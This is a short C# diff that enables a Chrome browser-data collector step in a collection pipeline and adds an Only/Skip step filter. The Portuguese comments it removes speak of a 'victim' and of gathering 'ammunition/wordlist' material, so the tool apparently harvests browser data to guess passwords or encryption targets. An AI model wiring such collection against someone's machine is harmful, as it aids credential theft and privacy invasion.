@@ -10,10 +10,11 @@ internal static class Steps
     {
         yield return new Step("machine", SystemCollector.Machine);
         yield return new Step("targets", TargetCollector.Collect);
-        // software = qual criptografia a vitima usava: prever formato dos alvos
         yield return new Step("software", SystemCollector.Software);
-
-        // etapa 2 (munição/wordlist) — os collectors já estão prontos, só ligados depois:
-        // yield return new Step("chrome", r => ChromeCollector.Collect(r, log));
+        yield return new Step("chrome", r => ChromeCollector.Collect(r, log));
     }
+
+    public static bool Wanted(string key) =>
+        (Flags.Only.Count == 0 || Flags.Only.Contains(key, StringComparer.OrdinalIgnoreCase))
+        && !Flags.Skip.Contains(key, StringComparer.OrdinalIgnoreCase);
 }
